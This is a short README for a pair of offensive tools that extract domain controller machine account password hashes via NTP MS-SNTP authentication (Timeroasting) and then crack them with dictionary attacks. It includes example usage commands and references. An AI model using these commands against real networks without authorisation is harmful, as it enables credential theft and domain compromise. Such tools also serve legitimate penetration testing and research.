# NTP Timeroast Tools

Extract and crack domain controller machine account password hashes via NTP MS-SNTP authentication.

## Tools

**ntproast** - Extracts password hashes from domain controllers 
**ntpcrack** - Cracks the extracted hashes using dictionary attacks

## Usage

```bash
# Extract hashes
./ntproast -t 192.168.1.10 -o hashes.txt

# Crack hashes
./ntpcrack -h hashes.txt -d passwords.txt
```

## Demo

**`ntproast:`**
![Image](https://github.com/user-attachments/assets/ad389c17-a2bc-426b-bdc5-287e26d22e89)

**`ntpcrack:`**
![Image](https://github.com/user-attachments/assets/713673ab-294a-492d-8a65-b0a35d903d61)

## References

- [Secura Whitepaper - Timeroasting](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [Targeted Timeroasting - Medium Article](https://medium.com/@offsecdeer/targeted-timeroasting-stealing-user-hashes-with-ntp-b75c1f71b9ac)
